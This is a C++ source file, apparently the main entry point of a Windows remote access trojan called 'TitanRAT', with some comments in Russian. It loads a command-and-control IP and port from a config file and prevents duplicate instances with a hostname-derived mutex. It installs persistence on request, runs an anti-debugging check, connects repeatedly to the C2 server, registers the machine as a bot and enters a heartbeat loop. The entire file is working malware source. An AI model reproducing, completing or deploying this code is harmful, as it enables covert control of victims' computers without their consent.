// Core/main.cpp
#include "network.h" // Это тянет winsock2, windows, string и Config
#include "persistence.h"
#include "anti_debug.h"
#include <fstream>
#include <cctype>

// Теперь Config уже определён через network.h

constexpr unsigned long long FNV_OFFSET_BASIS = 14695981039346656037ULL;
constexpr unsigned long long FNV_PRIME = 1099511628211ULL;

static std::string trim(const std::string& s) {
    size_t start = s.find_first_not_of(" \t\r\n");
    if (start == std::string::npos) return "";
    size_t end = s.find_last_not_of(" \t\r\n");
    return s.substr(start, end - start + 1);
}

static bool find_string_value(const std::string& json, const std::string& key, std::string& out) {
    std::string search = "\"" + key + "\"";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return false;
    pos = json.find(':', pos + search.length());
    if (pos == std::string::npos) return false;
    pos = json.find('"', pos + 1);
    if (pos == std::string::npos) return false;
    size_t end = json.find('"', pos + 1);
    if (end == std::string::npos) return false;
    out = json.substr(pos + 1, end - pos - 1);
    return true;
}

static bool find_int_value(const std::string& json, const std::string& key, int& out) {
    std::string search = "\"" + key + "\"";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return false;
    pos = json.find(':', pos + search.length());
    if (pos == std::string::npos) return false;
    pos = json.find_first_not_of(" \t\r\n", pos + 1);
    if (pos == std::string::npos) return false;
    size_t end = pos;
    if (json[end] == '-' || json[end] == '+') end++;
    while (end < json.length() && std::isdigit(json[end])) end++;
    if (end == pos || (end == pos + 1 && (json[pos] == '-' || json[pos] == '+'))) return false;
    try { out = std::stoi(json.substr(pos, end - pos)); return true; } catch (...) { return false; }
}

static bool load_config(Config& cfg) {
    char exe_path[MAX_PATH];
    if (!GetModuleFileNameA(nullptr, exe_path, sizeof(exe_path))) {
        MessageBoxA(nullptr, "[TitanRAT] Failed to get executable path", "Error", MB_ICONERROR);
        return false;
    }
    std::string dir(exe_path);
    size_t last_slash = dir.find_last_of("\\/");
    if (last_slash != std::string::npos) dir = dir.substr(0, last_slash + 1);
    else dir = "";
    
    std::ifstream file(dir + "config.json", std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        MessageBoxA(nullptr, "[TitanRAT] Failed to open config.json", "Error", MB_ICONERROR);
        return false;
    }
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::string content(static_cast<size_t>(size), '\0');
    if (!file.read(&content[0], size)) {
        MessageBoxA(nullptr, "[TitanRAT] Failed to read config.json", "Error", MB_ICONERROR);
        return false;
    }
    
    if (!find_string_value(content, "c2_ip", cfg.c2_ip) ||
        !find_int_value(content, "c2_port", cfg.c2_port) ||
        !find_int_value(content, "heartbeat_interval", cfg.heartbeat_interval) ||
        !find_int_value(content, "auto_delete_days", cfg.auto_delete_days)) {
        MessageBoxA(nullptr, "[TitanRAT] Invalid config.json format", "Error", MB_ICONERROR);
        return false;
    }
    char log_buf[512];
    sprintf_s(log_buf, "[TitanRAT] Config: c2_ip=%s, c2_port=%d, heartbeat_interval=%d, auto_delete=%d\n",
              cfg.c2_ip.c_str(), cfg.c2_port, cfg.heartbeat_interval, cfg.auto_delete_days);
    OutputDebugStringA(log_buf);
    return true;
}

static unsigned long long fnv1a_hash(const char* data, size_t len) {
    unsigned long long hash = FNV_OFFSET_BASIS;
    for (size_t i = 0; i < len; i++) {
        hash ^= static_cast<unsigned char>(data[i]);
        hash *= FNV_PRIME;
    }
    return hash;
}

static bool has_arg(LPSTR cmdLine, const char* flag) {
    if (!cmdLine) return false;
    std::string cl = cmdLine;
    return cl.find(flag) != std::string::npos;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
    OutputDebugStringA("[TitanRAT] Started\n");
    
    char computer_name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computer_name);
    if (!GetComputerNameA(computer_name, &size)) {
        OutputDebugStringA("[TitanRAT] Failed to get computer name\n");
        return 1;
    }
    for (DWORD i = 0; i < size; i++) computer_name[i] = static_cast<char>(tolower(static_cast<unsigned char>(computer_name[i])));
    
    unsigned long long hash = fnv1a_hash(computer_name, size);
    char mutex_name[128];
    sprintf_s(mutex_name, "Global\\TitanRAT_%016llX", hash);
    
    HANDLE h_mutex = CreateMutexA(nullptr, FALSE, mutex_name);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        OutputDebugStringA("[TitanRAT] Already running\n");
        if (h_mutex) CloseHandle(h_mutex);
        return 0;
    }
    if (!h_mutex) {
        OutputDebugStringA("[TitanRAT] Failed to create mutex\n");
        return 1;
    }
    
    // CLI Handling
    if (has_arg(lpCmdLine, "--install")) {
        char path[MAX_PATH];
        GetModuleFileNameA(nullptr, path, MAX_PATH);
        install_persistence(path);
        CloseHandle(h_mutex);
        return 0;
    }
    if (has_arg(lpCmdLine, "--uninstall")) {
        uninstall_persistence();
        CloseHandle(h_mutex);
        return 0;
    }
    
    // Load Config
    Config cfg;
    if (!load_config(cfg)) {
        CloseHandle(h_mutex);
        return 1;
    }
    
    // Anti-debug check
    check_debugger();
    
    // Persistence check
    check_persistence();
    
    // Network Initialization
    OutputDebugStringA("[TitanRAT] Initializing network...\n");
    init_winsock();

    char hostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD hsize = sizeof(hostname);
    GetComputerNameA(hostname, &hsize);
    std::string hname(hostname);

    SOCKET sock = INVALID_SOCKET;
    
    // Connect Loop
    while (sock == INVALID_SOCKET) {
        OutputDebugStringA("[TitanRAT] Connecting to C2...\n");
        sock = connect_to_server(cfg.c2_ip, cfg.c2_port);
        if (sock == INVALID_SOCKET) {
            OutputDebugStringA("[TitanRAT] Connection failed. Retrying in 10s...\n");
            Sleep(10000);
        }
    }

    // Register
    register_with_server(sock, hname, g_bot_id);
    
    if (!g_bot_id.empty()) {
        OutputDebugStringA("[TitanRAT] Entering heartbeat loop...\n");
        heartbeat_loop(sock, cfg); // Blocks here
    } else {
        OutputDebugStringA("[TitanRAT] Registration failed. Exiting.\n");
    }

    shutdown_network_async();  // Корректно останавливает фоновый отправщик

    cleanup_winsock();
    CloseHandle(h_mutex);
    return 0;
}